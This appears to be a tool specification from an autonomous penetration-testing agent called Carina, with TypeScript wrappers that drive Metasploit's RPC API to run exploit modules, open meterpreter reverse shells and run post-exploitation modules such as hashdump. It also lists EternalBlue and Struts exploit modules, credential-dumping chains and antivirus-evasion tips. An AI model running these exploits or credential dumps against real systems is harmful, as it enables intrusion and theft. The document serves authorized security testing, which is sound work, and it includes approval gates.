# Tool: metasploit | #18 | Exploitation Framework

## Metadata
- **Priority:** CRITICAL
- **Source:** Kali Linux
- **Binary:** `msfconsole` (automation via `msfrpcd` + `msfdb` or `msfvenom` for payloads)
- **Package:** `metasploit-framework`
- **Risk Level:** critical
- **Requires Human Approval:** yes
- **OS Compatibility:** kali, parrot

## Purpose
The industry-standard exploitation framework with 2000+ exploit modules, 500+ payloads, post-exploitation modules, and auxiliary scanners. Carina orchestrates Metasploit's RPC API to autonomously select, execute, and validate exploits against discovered vulnerabilities; then conduct post-exploitation data gathering.

## Carina CLI Command
```
carina exploit run <module> <target> [--payload <name>] [--options key=val,...]
carina exploit suggest <service> <version>
carina exploit post <session-id> --module <post-module>
```

## TypeScript Wrapper

```typescript
// Carina communicates with Metasploit via msfrpcd (RPC daemon)
// Start: msfrpcd -P carina_msf_pass -S -a 127.0.0.1 -p 55553

export interface MsfSession {
  id: number;
  type: string; // meterpreter, shell, powershell
  target: string;
  platform: string;
  via_exploit: string;
  tunnel_peer: string;
}

export const metasploitTool: ToolDefinition = {
  name: 'metasploit_run',
  description: 'Exploitation framework; 2000+ exploits, 500+ payloads, post-exploitation modules.',
  parameters: {
    target:      { type: 'string', description: 'Target IP or hostname', required: true },
    port:        { type: 'number', description: 'Target port', required: true },
    module:      { type: 'string', description: 'Exploit module path (e.g., exploit/multi/http/struts2_code_exec)', required: true },
    payload:     { type: 'string', description: 'Payload (e.g., linux/x64/meterpreter/reverse_tcp)', required: false },
    lhost:       { type: 'string', description: 'Listener host (Carina IP)', required: false },
    lport:       { type: 'number', description: 'Listener port', default: 4444 },
    extraOpts:   { type: 'object', description: 'Additional module options', required: false },
    dryRun:      { type: 'boolean', default: false, description: 'Check exploit compatibility, don\'t execute' },
    timeout:     { type: 'number', default: 120, description: 'Exploit timeout seconds' },
  },
  requires: ['msfrpcd'],  // requires Metasploit RPC daemon running
  risk: 'critical',
  category: 'exploit',
  requiresApproval: true,
  handler: async (params, ctx) => {
    await ctx.requestApproval(`Exploitation attempt: ${params.module} against ${params.target}:${params.port}`);
    const msf = await connectMsfRpc();
    // 1. Validate module exists and target is compatible
    const info = await msf.call('module.info', ['exploit', params.module]);
    // 2. Set options
    const opts = {
      RHOSTS: params.target,
      RPORT: params.port,
      PAYLOAD: params.payload || info.default_payload,
      LHOST: params.lhost || ctx.carinaIp,
      LPORT: params.lport || 4444,
      ...params.extraOpts,
    };
    if (params.dryRun) return { compatible: true, module: params.module, options: opts };
    // 3. Execute
    const job = await msf.call('module.execute', ['exploit', params.module, opts]);
    const result = await msf.waitForJob(job.job_id, params.timeout || 120);
    // 4. Return session info
    const sessions = await msf.call('session.list');
    return { job, result, sessions, exploit_module: params.module };
  },
};

// Supplementary: exploit suggestion tool
export const metasploitSuggestTool: ToolDefinition = {
  name: 'metasploit_suggest',
  description: 'Suggest exploits for a given service and version.',
  parameters: {
    service:  { type: 'string', description: 'Service name (e.g., apache, nginx, ssh)', required: true },
    version:  { type: 'string', description: 'Version (e.g., 2.4.49)', required: true },
    os:       { type: 'string', description: 'OS filter', required: false },
  },
  requires: ['msfrpcd'],
  risk: 'low',
  category: 'exploit',
  handler: async (params, ctx) => {
    const msf = await connectMsfRpc();
    const matches = await msf.call('module.search', [`type:exploit ${params.service} ${params.version}`]);
    return { service: params.service, version: params.version, exploits: matches };
  },
};

// Post-exploitation tool
export const metasploitPostTool: ToolDefinition = {
  name: 'metasploit_post',
  description: 'Run post-exploitation module on an active session.',
  parameters: {
    sessionId: { type: 'number', description: 'Active session ID', required: true },
    module:    { type: 'string', description: 'Post module (e.g., post/linux/gather/hashdump)', required: true },
    options:   { type: 'object', description: 'Module options', required: false },
  },
  requires: ['msfrpcd'],
  risk: 'high',
  category: 'exploit',
  requiresApproval: true,
  handler: async (params, ctx) => {
    const msf = await connectMsfRpc();
    const result = await msf.call('module.execute', ['post', params.module, { SESSION: params.sessionId, ...params.options }]);
    return result;
  },
};
```

## Parameters
| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| target | string | yes |; | Target IP/hostname |
| port | number | yes |; | Target port |
| module | string | yes |; | Exploit module path |
| payload | string | no | auto | Payload selection |
| lhost | string | no | auto | Listener IP |
| lport | number | no | 4444 | Listener port |
| dryRun | boolean | no | false | Check without executing |
| extraOpts | object | no |; | Additional options |

## Common Modules
| Module | Target | Payload |
|--------|--------|---------|
| exploit/multi/http/struts2_code_exec | Apache Struts | java/meterpreter/reverse_tcp |
| exploit/unix/ftp/vsftpd_234_backdoor | vsftpd 2.3.4 | cmd/unix/interact |
| exploit/windows/smb/ms17_010_eternalblue | Windows SMBv1 | windows/x64/meterpreter/reverse_tcp |
| exploit/multi/http/tomcat_mgr_upload | Tomcat Manager | java/meterpreter/reverse_tcp |
| exploit/linux/http/grafana_plugin_traversal | Grafana < 8.3 | linux/x64/meterpreter/reverse_tcp |

## Workflow Chains
```
UPSTREAM:   01-nmap (service+version), 11-nuclei (confirmed vulns), 13-sqlmap (SQLi → OS cmd)
DOWNSTREAM: 25-mimikatz (credential dumping), 24-crackmapexec (lateral movement), 68-bloodhound (AD mapping)
CHAINS:     nuclei CVE → metasploit exploit → post module (hashdump/loot)
            metasploit session → crackmapexec (pivot to other hosts)
```

## Structured Output
```json
{
  "module": "exploit/multi/http/struts2_code_exec",
  "target": "10.0.0.5",
  "port": 8080,
  "status": "exploited",
  "session": {
    "id": 1,
    "type": "meterpreter",
    "platform": "linux",
    "info": "uid=1000(tomcat) gid=1000(tomcat)",
    "tunnel": "10.0.0.5:4444 -> 192.168.1.100:55553"
  },
  "duration": 4.2
}
```

## Pitfalls
1. **MSFRPCD setup**; RPC daemon must be running; start with `msfrpcd -P <pass> -S -a 127.0.0.1`
2. **Payload AV detection**; meterpreter payloads are signatured; use staged or custom encoding
3. **Firewall rules**; reverse_tcp needs Carina reachable from target; bind_tcp if behind NAT
4. **Session death**; post-exploit sessions die on reboot or process death
5. **Database required**; msfdb must be initialized (`msfdb init`)
6. **Ethical boundary**; always confirm scope; never exploit without written authorization
7. **Payload generation**; msfvenom for standalone payloads when direct exploit not available

## Verification
```bash
which msfconsole && msfconsole --version
msfdb status
msfrpcd -P testpass -S -a 127.0.0.1 -p 55553 &
sleep 2 && curl -k https://127.0.0.1:55553/api/ -H 'Authorization: Bearer testpass'
```
